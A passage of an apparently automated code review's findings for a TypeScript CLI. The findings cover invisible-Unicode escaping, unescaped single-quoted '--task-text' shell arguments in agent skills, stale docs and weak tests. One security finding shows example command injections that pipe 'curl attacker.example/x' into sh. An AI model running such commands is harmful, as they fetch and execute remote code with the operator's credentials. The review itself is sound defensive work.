    "problem": "The r02 fix for the References tab escaping routes every line through cardSafe (src/lib/card-safe.ts), which was written for model-supplied card text. The repository's helper for committed, attacker-controlled files is terminalSafe/terminalSafeBlock (src/lib/terminal-safe.ts), whose header says why: it must also cover zero-width and other format characters, the Unicode tag block, variation selectors, default-ignorables and U+2028/2029, and it must render them visibly rather than drop them. cardSafe removes ESC sequences, C0/C1 controls, CR/LF, tabs and the bidi override ranges only. Probed on the same input: cardSafe(\"STYLING\\u200b.md \\u{E0041}\\u{E0042} a\\u2028b \\u2800 \\u001b[2Kx\\u001b\\u0001[1Ay\") keeps the zero-width space, both tag characters, U+2028 and U+2800 unchanged and, for the split escape, leaves the printable remainder \"x[1Ay\" with no marker that anything was removed; terminalSafe renders each of them as a visible \\uXXXX/\\xHH escape. Escape-sequence injection is closed by this fix (all ESC bytes are gone: the final C0 pass removes any ESC the CSI/OSC regexes missed).",
    "impact": "Attack vector: a repository author puts invisible code points in references.json (description, anchor, path, keyword, glob) or in a heading of a declared document, for example U+200B inside a path so `STYLING\\u200b.md` reads as `STYLING.md`, or Unicode tag characters carrying hidden words. The /projectctx References tab, the view an operator uses to see which documents will be forced on the agent and why, shows text that differs from what is stored, and silently drops removed bytes. The description and anchor are the same strings handed to the agent in the resolve output, so hidden text there is unreviewable by the operator in this UI. No terminal control is gained; this is a display-fidelity and review-evasion gap against the repository's own stated standard, hence minor.",
    "suggested_fix": "Use the repository helper in the one sink: import { terminalSafeBlock } from \"../lib/terminal-safe\" and pass terminalSafeBlock(lines.join(\"\\n\")).text instead of lines.map(cardSafe).join(\"\\n\"); keep cardSafe on the sidebar value or switch it to terminalSafe(...).text as well. Line counts and the contentRows computation are unaffected because \\n is kept. Add a test with U+200B, U+E0041, U+2028 and a split escape in a description and assert the renderable content contains the visible \\uXXXX forms and no raw code point.",
    "evidence": "src/lib/card-safe.ts (regex ranges: \\u007f-\\u009f, \\u200e\\u200f, \\u202a-\\u202e, \\u2066-\\u2069 only); src/lib/terminal-safe.ts header and UNSAFE_CODE_POINT_RE; probe output: cardSafe keeps U+200B, U+E0041, U+E0042, U+2028 and U+2800 verbatim and ends with \"x[1Ay\"; terminalSafe -> \"STYLING\\\\u200b.md \\\\ue0041\\\\ue0042 a\\\\u2028b \\\\u2800 \\\\x1b[2Kx\\\\x1b\\\\x01[1Ay\"; r02 review-security-code-w5 F-001 suggested terminalSafeBlock.",
    "confidence": "high",
    "reviewer": "review-security-code",
    "dedupe_key": "single:review-security-code-w6:F-002",
    "publication": "finding"
  },
  {
    "id": "review-security-code-w7:F-001",
    "severity": "major",
    "file": "src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md",
    "line": 182,
    "quote": "--task-text '<task.description>'",
    "problem": "r02 review-security-code-w4:F-002 reported that the skills tell the executing agent to put the task title and description into a double-quoted shell argument, where backticks and $(...) still run. This delta changes the quote character to single quotes in every instruction, but only flow-orchestrator/SKILL.md:323 (and its bundled copy) adds the sentence that makes single quotes safe: \"Write the text single-quoted (a ' inside it becomes '\\'')\". The other instructions give the bare form with no escape rule: task-implementer/SKILL.md:182 (--task-text '<task.description>'), tests-creator/SKILL.md:93 (--task-text '<task description>'), job-orchestrator/SKILL.md:749 and :1307, job-orchestrator/orchestrator-prompt.md:132 and :188, and README.md:270. Single quotes protect only until the first ' in the text. A task description is free markdown prose: \"don't\", \"the user's\" or \"it's\" ends the quote, and the rest of the description is then parsed by the shell unquoted, where the backticks and $(...) that markdown descriptions carry run as commands. The flow-orchestrator placeholder itself reads '<the task's title and description>', an apostrophe inside the quoted placeholder. The CLI still has no stdin or file route for the text (optionValue in src/lib/args.ts takes the next argv token), so argv quoting is the only path and the instruction is the only guard.",
    "impact": "Attack vector: task titles and descriptions reach these dispatches from analysed issues and PR text that outsiders can write, and from job analysis output. An issue body such as \"Don't touch `curl https://attacker.example/x | sh`\" or \"it's broken $(curl attacker.example/x|sh)\" is substituted into --task-text '...' by the agent following the instruction; the apostrophe closes the quote and the backtick or $(...) span executes in the agent's shell with the operator's credentials and working tree. Even without an attacker, every apostrophe in an ordinary description yields a malformed command (unterminated quote or split arguments), so the resolve step fails or silently receives a cut text and keyword promotion does not happen. The fix in the one orchestrator shows the rule is known; the workers that run inside a dispatch (task-implementer, tests-creator) and the job orchestrator are the ones without it.",
    "suggested_fix": "Put the escape rule at every site that tells an agent to build the command, or better, remove the need for quoting. Minimal: in task-implementer 2.0c, tests-creator 1.2b, job-orchestrator (both places), orchestrator-prompt (both places) and the README sentence, repeat \"write the text single-quoted; every ' inside it becomes '\\''\", and change the flow-orchestrator placeholder to '<task title and description>' without the apostrophe. Sturdier: give resolve-context a way to read the text from a file or stdin (for example --task-text-file <path>) and have the instructions write the text to a file first, as --out already does for the result, so no description byte is ever parsed by the shell. Keep the managed copies in .metaproject/skills in sync with src/gdskills/bundled (skill-sync.test.ts) and add a test that every skill line containing --task-text also names the escape rule or the file option.",
    "evidence": "Counts at head of the escape sentence vs. the bare single-quoted form: flow-orchestrator/SKILL.md 1 site, rule present; job-orchestrator/SKILL.md 2 sites, rule absent; job-orchestrator/orchestrator-prompt.md 2 sites, rule absent; task-implementer/SKILL.md 1 site, rule absent; tests-creator/SKILL.md 1 site, rule absent; README.md 1 site, rule absent (python over the files). Each skill file has a byte-identical copy under src/gdskills/bundled/skills (cmp on task-implementer confirms). The delta diff d6267d4..5382b56 for the skill files shows only the quote character change, except flow-orchestrator, which also gains the sentence. src/lib/args.ts optionValue shows no stdin or file route.",
    "confidence": "high",
    "reviewer": "review-security-code",
    "dedupe_key": "task-text-escape-rule-missing",
    "class_scope": {
      "sites": [
        ".metaproject/skills/gdskills/orchestration/task-implementer/SKILL.md:182 and src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md:182",
        ".metaproject/skills/gdskills/quality/tests-creator/SKILL.md:93 and src/gdskills/bundled/skills/quality/tests-creator/SKILL.md:93",
        ".metaproject/skills/gdskills/orchestration/job-orchestrator/SKILL.md:749 and :1307, and the bundled copy",
        ".metaproject/skills/gdskills/orchestration/job-orchestrator/orchestrator-prompt.md:132 and :188, and the bundled copy",
        "README.md:270",
        ".metaproject/skills/gdskills/orchestration/flow-orchestrator/SKILL.md:323 and bundled copy (has the rule, but the placeholder holds an apostrophe)",
        "docs/docs/guides/apply-project-rules.md:172 and docs/requirements/keryx-conditional-reads/live-run.md:136,155,170 are fixed double-quoted literals typed by an operator; not part of the class"
      ],
      "enumeration_method": "Scanned every tracked file outside .metaproject/{reviews,data,flows} for --task-text followed by a quote character (python over git ls-files), then checked each file for the '\\'' escape sentence. 8 instruction sites (each skill file with a bundled copy) plus README and 4 operator-typed doc examples; only the flow-orchestrator file carries the rule."
    }
  },
  {
    "id": "review-style-w1:F-001",
    "severity": "minor",
    "file": "docs/docs/guides/apply-project-rules.md",
    "line": null,
    "quote": "only: a rule imported with `--link` is not scanned, and neither are bundled",
    "problem": "The fix makes scanCitations read rules registered with --link at their origin (references-check.ts header now says 'A linked rule ... is scanned at its origin', and skills-references.test.ts has a test for it). The user guide's paragraph on the citation scan was not updated and still states the opposite limit.",
    "impact": "A reader of the guide believes `references check` / `suggest` ignore linked rules and may declare references by hand that the tool would have suggested, or distrust an 'unused-declaration' result. Documentation contradicts the code it documents (a comment-quality defect: actively wrong statement).",
    "suggested_fix": "Rewrite the sentence: 'The citation scan looks for backticked X.md names in project rules only (copied rules, and rules imported with --link, which are read at their origin); bundled rules are not scanned.'",
    "evidence": "docs/docs/guides/apply-project-rules.md:259-262 versus src/gdskills/references-check.ts:16 and :97-109 (links read via resolveOriginPath), and src/commands/skills-references.test.ts:333 ('a rule imported with --link is scanned at its origin').",
    "confidence": "high",
    "reviewer": "review-style",
    "dedupe_key": "docs-linked-rule-not-scanned"
  },
  {
    "id": "review-style-w1:F-002",
    "severity": "minor",
    "file": "src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md",
    "line": null,
    "quote": "--task-text '<task title and description>'",
    "problem": "The fix switches every --task-text template from double to single quotes, but the instruction that tells the dispatcher how to handle a `'` inside the text ('a `'` inside it becomes `'\\''`) was added at one site only, flow-orchestrator/SKILL.md. The other sites (job-orchestrator/SKILL.md step A and fix loop item 3, job-orchestrator/orchestrator-prompt.md steps 1 and FIX 2, task-implementer/SKILL.md 2.0c, tests-creator/SKILL.md 1.2b) show the single-quoted form with no escape rule. The same instruction is therefore stated inconsistently across sibling sites.",
    "impact": "Task titles and descriptions routinely contain apostrophes ('the task's title'). A dispatcher following job-orchestrator or task-implementer pastes the text into '...' unescaped, the quote ends early and the shell reports a syntax error or runs the remainder. The class of defect the fix set out to remove (free text breaking the quoting) survives at four of five sites.",
    "suggested_fix": "Put the one-sentence rule ('single-quoted; a `'` inside the text becomes `'\\''`') at every site that shows the template, or state it once in a shared place the skills already cite. Update the bundled and managed copies together (skill-sync.test.ts keeps them byte-identical).",
    "evidence": "keryx ctx rg for `'\\''` over src/gdskills/bundled/skills, .metaproject/skills, docs/docs and README.md matches only flow-orchestrator/SKILL.md (bundled and managed copy). The job-orchestrator, orchestrator-prompt, task-implementer and tests-creator hits for --task-text carry the single quotes without the rule.",
    "confidence": "high",
    "reviewer": "review-style",
    "dedupe_key": "task-text-escape-rule-missing",
    "class_scope": {
      "sites": [
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:749 and :1307",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:132 and :188",
        "src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md:182",
        "src/gdskills/bundled/skills/quality/tests-creator/SKILL.md:93",
        "src/gdskills/bundled/skills/orchestration/flow-orchestrator/SKILL.md:323 (carries the rule; correct)",
        "managed copies of all of the above under .metaproject/skills/gdskills/"
      ],
      "enumeration_method": "keryx ctx rg --all -e 'task-text' -e 'task_text' over docs, README.md, src and .metaproject/skills excluding tests, then keryx ctx rg -F for the escape sequence."
    }
  },
  {
    "id": "review-style-w1:F-003",
    "severity": "info",
    "file": "src/gdskills/context-resolver.ts",
    "line": null,
    "quote": "taskTextLength: Array.from(options.taskText!).length",
    "problem": "A non-null assertion on options.taskText inside a branch already guarded by `task !== undefined`; the guard proves the value is defined only through a derived variable the compiler cannot see. After this change `task` is used for `.truncated` alone.",
    "impact": "Readability: the reader has to re-derive why the `!` is safe, and a later edit to the `task` condition could make it false silently.",
    "suggested_fix": "Bind the text once: `const text = options.taskText?.trim() ? options.taskText : undefined;` then use `text` for truncateTaskText and for the length, with no assertion.",
    "evidence": "src/gdskills/context-resolver.ts:531 builds `task` from `options.taskText !== undefined && ...trim() !== \"\"`; line 535 re-reads `options.taskText!`.",
    "confidence": "high",
    "reviewer": "review-style",
    "dedupe_key": "task-text-length-recompute"
  },
  {
    "id": "review-style-w1:F-004",
    "severity": "minor",
    "file": "src/gdskills/references-check.ts",
    "line": null,
    "quote": "const links = new Map((await readProjectRuleRegistry(projectRoot)).filter((entry) => entry.mode === \"link\" && !copies.includes(entry.ref)).map((entry) => [entry.ref, entry.origin]));",
    "problem": "The fix for the linked-rules finding re-implements, in a 190-character chained one-liner, part of what collectProjectRules in context-resolver.ts already does (registry link entries, no copy on disk, resolveOriginPath, readFile). It is not the shared helper the original finding asked for, and the two copies already differ: the resolver excludes a link whose sha256 no longer matches the registry (with a warning), scanCitations reads it regardless.",
    "impact": "Two readers of the same rule source drift apart over time. Concrete case: after the origin file of a linked rule is edited, `references check` still counts its citations while `resolve-context` has excluded the rule, which is the check-versus-resolver disagreement the original finding set out to remove, now in a narrower corner. The dense expression is also hard to scan for the next editor.",
    "suggested_fix": "Export a small 'project rule texts, copied and linked' function from context-resolver.ts (or project-rules.ts), return `{ ref, path, text }` plus unreadable refs, and have collectProjectRules and scanCitations both use it; if the sha256 check is deliberately skipped for authoring, say so in the header. At minimum split the Map construction into named steps.",
    "evidence": "src/gdskills/references-check.ts:97-109 versus src/gdskills/context-resolver.ts:205-230 (collectProjectRules: sha256Hex(text) !== entry.sha256 => excluded with warning).",
    "confidence": "medium",
    "reviewer": "review-style",
    "dedupe_key": "scancitations-linked-rule-parity"
  },
  {
    "id": "review-style-w2:F-001",
    "severity": "major",
    "file": "docs/docs/guides/apply-project-rules.md",
    "line": null,
    "quote": "only: a rule imported with `--link` is not scanned, and neither are bundled",
    "problem": "The r03 delta makes `references check`/`suggest` scan a rule imported with `--link` at its origin (references-check.ts now reads `resolveOriginPath(origin, projectRoot)`; the new test 'a rule imported with --link is scanned at its origin' asserts it). The code comment in references-check.ts:16 was updated, but two user-facing statements still say the opposite: this guide paragraph and the `references check` row in cli-reference.md ('Citations are backticked `X.md` names in `.metaproject/rules/project/`; a linked rule is not scanned.').",
    "impact": "Trigger: an operator who imported rules with `--link` reads the guide or CLI reference before running `keryx skills references check`. Outcome: the docs tell them their linked rules' citations are invisible to the check, yet the command reports `undeclared-citation` for documents cited by those rules (and no longer reports `unused-declaration` for them); they will treat correct output as a bug or add declarations they believe are unneeded. Documentation that is actively wrong is a major comment-quality defect.",
    "suggested_fix": "Rewrite the guide sentence to 'The citation scan looks for backticked `X.md` names in project rules, including rules imported with `--link` (read at their origin); bundled rules are not scanned.' and end the cli-reference row with 'a rule imported with `--link` is scanned at its origin.' Both docs must change together.",
    "evidence": "docs/docs/guides/apply-project-rules.md:261 and docs/docs/cli-reference.md:3491 say linked rules are not scanned; src/gdskills/references-check.ts:16 and :98 and src/commands/skills-references.test.ts:333 say and prove they are. keryx ctx rg for 'linked rule|imported with .--link|not scanned' over README.md, docs (excluding docs/requirements), src/gdskills, src/commands and .metaproject/skills/gdskills returned exactly these two stale statements; the earlier findings review-architecture-w3:F-002 and review-logic-w2:F-001 covered the code, not these docs.",
    "confidence": "high",
    "reviewer": "review-style",
    "dedupe_key": "docs-linked-rule-not-scanned",
    "class_scope": {
      "sites": [
        "docs/docs/guides/apply-project-rules.md:261",
        "docs/docs/cli-reference.md:3491 (references check row)"
      ],
      "enumeration_method": "keryx ctx rg -n --all 'linked rule|imported with .--link|not scanned' README.md docs src/gdskills src/commands .metaproject/skills/gdskills --glob '!docs/requirements/**' (17 matches, 2 are the stale claim; the rest concern import/update/remove behaviour)"
    }
  },
  {
    "id": "review-style-w2:F-002",
    "severity": "minor",
    "file": "src/tui/project-context-inspector.ts",
    "line": null,
    "quote": "import { cardSafe } from \"../lib/card-safe\";",
    "problem": "The new import sits between two sibling (`./`) imports. Every other import in the block is ordered type-only project imports, then siblings alphabetically; a `../lib` import in the middle breaks both the grouping and the order.",
    "impact": "Import-group convention (framework/project, then relative, blank line between groups) is not followed; the next editor cannot tell where a new import goes.",
    "suggested_fix": "Move the line to sit with the `../gdskills/...` import above `./modal-host`, so parent-directory imports come before sibling ones.",
    "evidence": "src/tui/project-context-inspector.ts lines 8-14: `../gdskills/project-context-status`, `./modal-host`, `../lib/card-safe`, `./execution-plan-inspector`, `./project-references-view`, `./theme`, `./theme-repaint`.",
    "confidence": "high",
    "reviewer": "review-style",
    "dedupe_key": "card-safe-import-order"
  },
  {
    "id": "review-style-w2:F-003",
    "severity": "minor",
    "file": "src/gdskills/context-resolver.ts",
    "line": null,
    "quote": "...(task !== undefined ? { taskTextLength: Array.from(options.taskText!).length, ...(task.truncated ? { taskTextTruncated: true as const } : {}) } : {}),",
    "problem": "One dense line holds a ternary, a nested conditional spread and a non-null assertion (`options.taskText!`) that re-splits the whole text into code points after `truncateTaskText` already did the same split (`Array.from(text)` inside it) and then discarded the count.",
    "impact": "Hard to read, the `!` is only safe because of the `task !== undefined` check four lines up, and the length is computed twice with the same idiom. Related to the three code-point counters already noted in review-clean-code-w3:F-010, but this is the readability side (assertion and nested spread), not the duplication count.",
    "suggested_fix": "Have `truncateTaskText` also return `length` (the code-point count it already has), then write `const task = ...; const record = { recordedAt, result, ...(task ? { taskTextLength: task.length, ...(task.truncated ? { taskTextTruncated: true as const } : {}) } : {}) }` after splitting the optional pieces into a small `taskTextFields(task)` helper.",
    "evidence": "src/gdskills/context-resolver.ts:531-535 and truncateTaskText at :74-76.",
    "confidence": "medium",
    "reviewer": "review-style",
    "dedupe_key": "task-text-length-recompute"
  },
  {
    "id": "review-style-w2:F-004",
    "severity": "info",
    "file": "src/gdskills/context-resolver.test.ts",
    "line": null,
    "quote": "await recordLastResolve(root, result, { taskText: `${\"x\".repeat(TASK_TEXT_MAX_CHARS + 50)}` });",
    "problem": "A template literal that only interpolates one expression: `${\"x\".repeat(...)}` wraps a plain string.",
    "impact": "Noise; reads as if something were being concatenated.",
    "suggested_fix": "`{ taskText: \"x\".repeat(TASK_TEXT_MAX_CHARS + 50) }`. Same test also mixes `text.length` (line 428) with the code-point count the implementation records; fine for ASCII, but a short comment or `Array.from` would keep it honest if the fixture ever gains an emoji.",
    "evidence": "src/gdskills/context-resolver.test.ts:432.",
    "confidence": "high",
    "reviewer": "review-style",
    "dedupe_key": "template-literal-noop-test"
  },
  {
    "id": "review-style-w2:F-005",
    "severity": "minor",
    "file": "src/commands/skills-references.test.ts",
    "line": null,
    "quote": "upsert: [entry(\"styling.mdc\", linkedRule, RULE), entry(\"other.mdc\", second, ",
    "problem": "In the new --link test the second rule's text is written out twice as the same multi-line literal: once for `writeFile(second, ...)` and again as the third argument of `entry(\"other.mdc\", ...)`, which hashes it.",
    "impact": "If one copy is edited the registry hash silently stops matching the file on disk, and the test then fails for a reason unrelated to what it checks. Same shape as the repeated rule literal in review-style-w2:F-005 (prior round).",
    "suggested_fix": "`const OTHER_RULE = \"---\\ndescription: other\\nglobs: src/**\\nalwaysApply: false\\n---\\n\\nRead `OTHER.md` first.\\n\";` once, then `writeFile(second, OTHER_RULE, ...)` and `entry(\"other.mdc\", second, OTHER_RULE)`. Better still, let `entry` take the text and write the file itself.",
    "evidence": "src/commands/skills-references.test.ts:341 and :356.",
    "confidence": "high",
    "reviewer": "review-style",
    "dedupe_key": "single:review-style-w2:F-005"
  },
  {
    "id": "review-style-w2:F-006",
    "severity": "info",
    "file": "src/gdskills/reference-entries.test.ts",
    "line": null,
    "quote": "maxFileBytes: 1_000_000,",
    "problem": "Magic number in the new test; the production cap for a cited document is already a named export.",
    "impact": "The test does not say whether 1_000_000 is meant to be 'the real limit' or 'big enough'.",
    "suggested_fix": "Import and use the named constant (CONTRACT_MAX_BYTES from ./context-resolver, if that is the cap the resolver passes) or name a local `const ROOMY = 1_000_000`.",
    "evidence": "src/gdskills/reference-entries.test.ts:45; CONTRACT_MAX_BYTES is exported from src/gdskills/context-resolver.ts.",
    "confidence": "medium",
    "reviewer": "review-style",
    "dedupe_key": "single:review-style-w2:F-006"
  },
  {
    "id": "review-style-w2:F-007",
    "severity": "info",
    "file": ".metaproject/skills/gdskills/orchestration/job-orchestrator/SKILL.md",
    "line": null,
    "quote": "--task-text '<task title and description>'",
    "problem": "The r03 change moved every `--task-text` placeholder to single quotes, but only flow-orchestrator/SKILL.md says why and how to escape (a `'` inside becomes `'\\''`; double quotes let the shell run backticks and `$(...)`). job-orchestrator SKILL.md (3 sites), orchestrator-prompt.md (2), task-implementer SKILL.md and tests-creator SKILL.md carry the bare single-quoted placeholder.",
    "impact": "A task title or description with an apostrophe (common prose) still breaks the command in those copies, and an agent reading only one of them does not learn the rule. Guidance is stated once in four places and silently dropped in the rest.",
    "suggested_fix": "Add the same one-line note ('single-quote the text; a `'` inside becomes `'\\''`') beside the first placeholder in each skill, or point to flow-orchestrator by name. Edit the bundled copies under src/gdskills/bundled/skills in the same change.",
    "evidence": "keryx ctx rg -n \"single-quot|--task-text '\" over .metaproject/skills/gdskills/orchestration, tests-creator/SKILL.md, README.md and the guide: only flow-orchestrator/SKILL.md:323 explains the escaping. Related to review-clean-code-w2:F-002 (Step B ellipsis lacks --task-text).",
    "confidence": "medium",
    "reviewer": "review-style",
    "dedupe_key": "task-text-escape-rule-missing"
  },
  {
    "id": "review-style-w2:F-008",
    "severity": "info",
    "file": "src/tui/project-context-inspector.test.ts",
    "line": null,
    "quote": "const onDestroy = source.slice(source.indexOf(\"onDestroy: () => {\"), source.indexOf(\"onDestroy: () => {\") + 2500);",
    "problem": "A source-text test with a magic 2500-character window and the same `indexOf` computed twice.",
    "impact": "The window is arbitrary: adding a few comment lines to `onDestroy` in tui-shell.ts silently pushes `stopProjectContextFeed?.()` out of range and the test fails with no hint why (testing-practices wave owns whether a source-reading test belongs at all).",
    "suggested_fix": "`const start = source.indexOf(\"onDestroy: () => {\");` and `const END_OF_ON_DESTROY = ...` (or search for the next closing marker) with a named constant explaining the window.",
    "evidence": "src/tui/project-context-inspector.test.ts:598.",
    "confidence": "medium",
    "reviewer": "review-style",
    "dedupe_key": "source-text-feed-stop-test"
  },
  {
    "id": "review-style-w3:F-001",
    "severity": "info",
    "file": "src/gdskills/context-resolver.test.ts",
    "line": null,
    "quote": "{ taskText: `${\"x\".repeat(TASK_TEXT_MAX_CHARS + 50)}` }",
    "problem": "The argument is a template literal whose only content is one interpolation, so it is the string `\"x\".repeat(...)` with extra syntax. The r03 rewrite of this line changed it from the plain call to the wrapped form.",
    "impact": "Readability only: a reader looks for the rest of the template and there is none.",
    "suggested_fix": "Pass the call directly: `{ taskText: \"x\".repeat(TASK_TEXT_MAX_CHARS + 50) }`.",
    "evidence": "context-resolver.test.ts line 432 at head: `await recordLastResolve(root, result, { taskText: `${\"x\".repeat(TASK_TEXT_MAX_CHARS + 50)}` });`. Nothing is concatenated with the interpolation.",
    "confidence": "high",
    "reviewer": "review-style",
    "dedupe_key": "template-literal-noop-test"
  },
  {
    "id": "review-style-w3:F-002",
    "severity": "info",
    "file": "src/tui/project-context-inspector.ts",
    "line": null,
    "quote": "import { cardSafe } from \"../lib/card-safe\";",
    "problem": "The new `../lib/card-safe` import sits after `./modal-host`, inside the sibling (`./`) imports. The file's existing order is `../gdskills/...` first, then `./...` siblings (the same shape review-style-w4:F-002 reported for project-context-inspector.test.ts).",
    "impact": "Convention drift in an import block that is otherwise parent-first. Low weight: src/tui/schedules-inspector.ts line 29 also places `../lib/card-safe` after other imports without grouping, so the project does not enforce an order here.",
    "suggested_fix": "Move the line directly under the `../gdskills/project-context-status` import, before `./modal-host`.",
    "evidence": "project-context-inspector.ts lines 8-14 at head: `../gdskills/project-context-status`, `./modal-host`, `../lib/card-safe`, `./execution-plan-inspector`, `./project-references-view`, `./theme`, `./theme-repaint`.",
    "confidence": "medium",
    "reviewer": "review-style",
    "dedupe_key": "card-safe-import-order"
  },
  {
    "id": "review-testing-practices-w1:F-001",
    "severity": "major",
    "file": "src/gdskills/reference-entries.test.ts",
    "line": null,
    "quote": "expect(keywordOccurs(\"rename the .css files\", \".css\")).toBe(true);",
    "problem": "The fix for review-logic-w3:F-002 (conditional lookarounds in keywordOccurs) is covered by tests that the old, buggy regex also passes. The defect was a symbol-edged keyword failing when a word character sits next to that edge ('styles.css' for '.css', 'a@apply' for '@apply'). Every symbol-edge assertion in the new first test puts a space (or the string start/end) next to the symbol: 'rename the .css files', 'use @apply in the sheet', 'add c++ bindings', 'USE @APPLY'. A lookbehind or lookahead that is unconditional succeeds on a space, so these cases never exercised the bug. No test in the delta contains 'styles.css' or any word character directly adjacent to a symbol edge of a keyword.",
    "impact": "Trigger: someone reverts or re-breaks keywordOccurs to apply both lookarounds unconditionally (the pre-fix form), or swaps the before/after edge test. Outcome: the suite stays green, and a task such as 'fix styles.css' silently stops promoting a document declared with keyword '.css', which is the exact silent skip of a mandatory read that F-002 reported. The F-008 gap is therefore only partly closed: digits, underscore, Cyrillic and metacharacters are now pinned (css3, my_css, css_modules, \u043f\u043e\u0434\u0442\u0435\u043c\u0430, a.b vs axb, c++), the punctuation-edge case is not.",
    "suggested_fix": "Add cases with a word character glued to the symbol edge, e.g. expect(keywordOccurs(\"fix styles.css please\", \".css\")).toBe(true); expect(keywordOccurs(\"a@apply\", \"@apply\")).toBe(true); expect(keywordOccurs(\"c++x\", \"c++\")).toBe(true) (no trailing boundary after a symbol), plus the boundary kept on the word side: expect(keywordOccurs(\"xc++\", \"c++\")).toBe(false) (leading boundary kept because the keyword starts with a word character). Optionally add one resolveReferences case with taskText 'tidy styles.css' and keyword '.css'.",
    "evidence": "Ran the pre-fix regex (`(?<![\\p{L}\\p{N}_])<escaped>(?![\\p{L}\\p{N}_])`, flags iu) under bun on the four inputs of the first new test: all four return true, the same as the fixed function. The same regex returns false only for ('fix styles.css please', '.css'), which no test uses; the fixed function returns true for it and for ('a@apply', '@apply'). So reverting the fix would not fail any assertion in reference-entries.test.ts. Mutation pass (research-evidence/mutation-1.json): mutant:main-M-10 and mutant:main-M-11 (keywordOccurs lookarounds made unconditional) both survived the test command.",
    "confidence": "high",
    "reviewer": "review-testing-practices",
    "dedupe_key": "single:review-testing-practices-w1:F-001",
    "class_scope": {
      "sites": [
        "src/gdskills/reference-entries.test.ts: keywordOccurs 'a keyword starting or ending with a symbol' (four assertions, none with a word char next to the symbol edge)",
        "src/gdskills/context-resolver.test.ts and src/gdskills/conditional-reads.e2e.test.ts: keyword promotion cases use word keywords only"
      ],
      "enumeration_method": "keryx ctx rg for keywordOccurs and for the keywords '.css'/'@apply' across src tests; ran the old regex against every symbol-edge input in the delta to see which would distinguish old from new behaviour."
    }
  },
  {
    "id": "review-testing-practices-w2:F-001",
    "severity": "minor",
    "file": "src/tui/project-context-inspector.test.ts",
    "line": null,
    "quote": "expect(control.test(renderProjectContextSidebarValue(status) ?? \"\")).toBe(false);",
    "problem": "Vacuous assertion (testing rule: tests must be able to fail). The test is named 'control characters from a reference never reach the terminal: tab body and sidebar value are cleaned', but the sidebar half asserts on renderProjectContextSidebarValue(status), whose references segment (referencesSidebarSegment in src/tui/project-references-view.ts) returns only 'refs <p>/<n>', '-', '?' or '!<k>': counts and symbols that carry no declaration text. The control characters in the fixture live in a reference description, which never reaches that string.",
    "impact": "If the cardSafe wrapper at project-context-inspector.ts:105 (the sidebar value) were removed, this test would stay green, so the sidebar half gives false confidence that the slice's cardSafe-on-sidebar hardening is guarded. The tab half (text.replace(...) plus the 'line one \u23ce line two' check) is a real guard and is unaffected.",
    "suggested_fix": "Either drop the sidebar line and rename the test to cover the tab body only, or make the sidebar path carry hostile text and assert on it: put a control character into a field the sidebar value actually renders (for example the project-context warning text, if the sidebar shows it), assert the raw value would contain it before cardSafe, then assert the rendered value does not. A direct unit test of renderProjectContextSidebarValue with such a field is the cleanest form.",
    "evidence": "src/tui/project-context-inspector.test.ts:630 holds the assertion. src/tui/project-references-view.ts: referencesSidebarSegment returns 'refs p/n', '-', '?' or '!k' and no declaration strings. src/tui/project-context-inspector.ts:105 'return cardSafe(parts.join(\" \u00b7 \"));' and :239 'lines.map(cardSafe)' are the two guarded sites; only :239 is exercised by the test's tab half.",
    "confidence": "high",
    "reviewer": "review-testing-practices",
    "dedupe_key": "sidebar-cardsafe-unpinned",
    "location_class": "in-diff"
  },
  {
    "id": "review-testing-practices-w2:F-002",
    "severity": "minor",
    "file": "src/commands/skills-references.test.ts",
    "line": null,
    "quote": "expect(suggestion.ok && suggestion.suggestion.references.map((entry) => entry.path)).toEqual([\"OTHER.md\"]);",
    "problem": "The closing assertion of the new --link test folds a guard into the value under test. If suggestion.ok is false, the expression evaluates to false and the failure reads 'expected [\"OTHER.md\"], received false', which hides the real cause (the error the suggest call returned). It also type-narrows through a boolean-and instead of a plain precondition.",
    "impact": "A regression in origin scanning or registry reading shows up as an opaque diff and costs a debugging step; the test still fails, so this is a diagnostics and clarity issue rather than a gap in coverage.",
    "suggested_fix": "Assert the precondition first and then the value: expect(suggestion.ok).toBe(true); if (!suggestion.ok) throw new Error(JSON.stringify(suggestion)); expect(suggestion.suggestion.references.map((entry) => entry.path)).toEqual([\"OTHER.md\"]);",
    "evidence": "src/commands/skills-references.test.ts:362 (end of the test that starts at :333, 'a rule imported with --link is scanned at its origin: ...'). Test passes at head.",
    "confidence": "high",
    "reviewer": "review-testing-practices",
    "dedupe_key": "single:review-testing-practices-w2:F-002",
    "location_class": "in-diff"
  },
  {
    "id": "review-testing-practices-w2:F-003",
    "severity": "minor",
    "file": "src/commands/skills-references.test.ts",
    "line": null,
    "quote": "a rule imported with --link is scanned at its origin: suggest finds its citation and check does not call the declaration unused",
    "problem": "The new --link test only covers the happy path where the registry entry's sha256 and originSha256 match the origin file. The resolver ignores a linked rule whose recorded hash differs from the origin (the origin changed after import), but scanCitations in src/gdskills/references-check.ts reads the origin without comparing any hash (rg for sha256/originSha256 in that file returns no match). The two code paths can therefore disagree, and no test pins which behaviour is intended.",
    "impact": "When a linked rule's origin is edited after import, the resolver stops treating its citations as live while `references check` and `suggest` keep counting them, so a declaration can be reported as used although the resolver never promotes it. Without a test, either behaviour can change silently. This is a coverage gap in a new branch of code, not a defect in the test as written.",
    "suggested_fix": "Add a case to the --link describe block: register the link, then rewrite the origin file so its sha256 no longer matches the registry entry, run checkReferences and suggest, and assert the intended outcome (either the citation is ignored like the resolver does, or it is reported with a stale-link warning). If the divergence is deliberate, document it in the test name.",
    "evidence": "src/commands/skills-references.test.ts:333-362 builds the link with matching hashes only. src/gdskills/references-check.ts scanCitations (lines ~60-150 at head) reads via resolveOriginPath/readProjectRuleRegistry with no hash comparison. The slice's resolver tests cover link handling on the resolver side only. The behavioural question is for review-logic; this finding is limited to the missing test.",
    "confidence": "medium",
    "reviewer": "review-testing-practices",
    "dedupe_key": "single:review-testing-practices-w2:F-003",
    "location_class": "in-diff"
  },
  {
    "id": "review-testing-practices-w2:F-004",
    "severity": "info",
    "file": "src/gdskills/references-section.test.ts",
    "line": null,
    "quote": "expect(performance.now() - started).toBeLessThan(1000);",
